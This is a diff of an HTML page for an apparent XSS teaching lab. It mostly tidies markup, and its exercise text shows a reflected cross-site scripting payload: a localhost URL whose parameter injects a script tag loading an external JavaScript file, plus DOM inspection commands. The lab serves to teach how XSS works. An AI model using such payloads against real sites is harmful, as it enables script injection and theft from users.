@@ -1,22 +1,11 @@
 <html>
-  <head>
-    <style>
-      span:after,
-      span:before {
-          content: '\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0';
-          text-decoration: line-through;
-          font-size: 24
-      }
-      * {
-          box-sizing: border-box;
-      }
-      body {
-          background-color: lightgreen;
-      }
-  </style>
+  <html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>XSS Lab</title>
-
-  </head>
+  <link rel="stylesheet" href="/styles.css">
+</head>
   <body>
 
     <h1>XSS Lab </h1>
@@ -29,6 +18,7 @@ Basically, wherever Javascript can exist, XSS may occur. In the exercise below, 
     <h3> Script or Text?</h3>
 
 Let's take a look at how Javascript is embedded into the DOM as either executable code or as text.
+<br>
     <textarea rows="25%" cols="100%">
 
 
@@ -54,15 +44,14 @@ document.getElementsByTagName('*')
 document.getElementsByTagName("*")[4].innerHTML
 document.getElementsByTagName("*")[4].outerHTML
 
-<hr>
+
 XSS attack 3: script in JS file
 -----------------------------------
 http://localhost:9081/xss-attack?xssvalue=<script src=http://localhost:3000/xss/xss.js> </script>
 document.getElementsByTagName('*')
 document.getElementsByTagName("*")[2].innerHTML
 document.getElementsByTagName("*")[2].outerHTML
-</textarea
-    >
+</textarea>
     <hr />
     <br /><br />
     <hr />
